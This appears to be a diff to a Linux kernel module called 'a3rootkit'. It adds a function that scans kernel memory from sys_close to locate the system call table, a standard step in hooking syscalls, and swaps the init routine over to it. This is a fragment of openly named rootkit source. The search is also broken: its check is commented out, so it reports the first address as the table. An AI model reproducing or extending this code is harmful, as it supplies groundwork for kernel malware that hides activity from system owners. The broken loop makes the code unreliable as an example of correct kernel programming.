@@ -5,6 +5,26 @@
 #include <linux/device.h>
 #include <asm/io.h>
 
+////////////////////////
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/delay.h>
+#include <asm/paravirt.h>
+#include <linux/dirent.h>
+#include <linux/file.h>
+#include <linux/fs.h>
+#include <asm/uaccess.h>    // Needed by segment descriptors
+#include <linux/slab.h>
+#include <linux/path.h>
+#include <linux/namei.h>
+#include <linux/fs_struct.h>    //for xchg(&current->fs->umask, ... )
+#include <asm/cacheflush.h>
+#include <linux/version.h>      //for checking kernel version
+#include <linux/syscalls.h>
+/////////////////////////
+
 #define DEVICE_NAME "a3rootkit"
 #define CLASS_NAME "a3rootkit"
 
@@ -30,6 +50,29 @@ static struct file_operations a3_rootkit_ops = {
     .release = a3_rootkit_release,
     .unlocked_ioctl = a3_rootkit_ioctl,
 };
+
+static unsigned long **acquire_sys_call_table(void)
+{
+    //below 4.17 kernel version, we can use this way ,sys_close function is exported.
+    unsigned long int offset = (unsigned long int)sys_close;
+    unsigned long **sct;
+
+    printk(KERN_INFO "finding syscall table from: %p\n", (void*)offset);
+
+    while (offset < ULLONG_MAX)
+    {
+    	sct = (unsigned long **)offset;
+
+    	//if (sct[__NR_close] == (unsigned long *)sys_close)
+        {
+            printk(KERN_INFO "sys call table found: %p\n", (void*)sct);
+    		return sct;
+        }
+    	offset += sizeof(void *);
+    }
+
+    return NULL;
+}
 
 void a3_rootkit_find_syscall_table(void)
 {
@@ -105,7 +148,8 @@ static int __init a3_rootkit_init(void)
     }
     printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");
 
-    a3_rootkit_find_syscall_table();//获取syscall系统调用表
+    //a3_rootkit_find_syscall_table();//获取syscall系统调用表
+    acquire_sys_call_table();
     return 0;
 
 err_dev:
